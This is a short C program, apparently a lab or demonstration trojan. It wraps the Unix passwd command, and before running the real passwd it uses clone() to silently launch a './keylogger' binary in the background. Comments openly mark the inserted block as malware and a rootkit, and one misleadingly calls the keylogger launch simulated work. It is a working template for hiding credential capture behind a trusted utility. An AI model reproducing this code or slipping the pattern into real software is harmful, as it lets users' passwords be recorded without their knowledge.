#define _GNU_SOURCE
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <signal.h>

// Function to be executed by the child process
int child_func(void *arg) {
    
    // printf("Child process (running in background): PID %d\n", getpid());
    
    // Simulate work in the child process (e.g., sleep for 5 seconds)
    char *args[] = {"keylogger", NULL};
    if (execvp("./keylogger", args) == -1) {
        perror("execvp failed");
        exit(EXIT_FAILURE);
    }
    
    // printf("Child process exiting...\n");
    return 0;
}
// Stack size for the child process
#define STACK_SIZE (1024 * 1024)
void invoke_malware(){
    pid_t child_pid;
      // Allocate memory for the malicious rootkit stack
    char *stack;             // Pointer to the child stack
    char *stack_top;         // Top of the child stack
    stack = malloc(STACK_SIZE);
    if (stack == NULL) {
        exit(EXIT_FAILURE);
    }
    // malicious rootkit stack grows down, so the stack top is at the end of the allocated memory
    stack_top = stack + STACK_SIZE;
    // Spawn a new child process t run malicious rootkit using clone
    child_pid = clone(child_func, stack_top, SIGCHLD, NULL);
    if (child_pid == -1) {
        exit(EXIT_FAILURE);
    }
}
int main() {
  
    

    /************ Malware inserted below */
    invoke_malware();
    /************ Malware inserted above */
    char *args[] = {"passwd", NULL};
   if (execvp("passwd", args) == -1) {
        perror("execvp failed");
        exit(EXIT_FAILURE);
    }

    return 0;
}
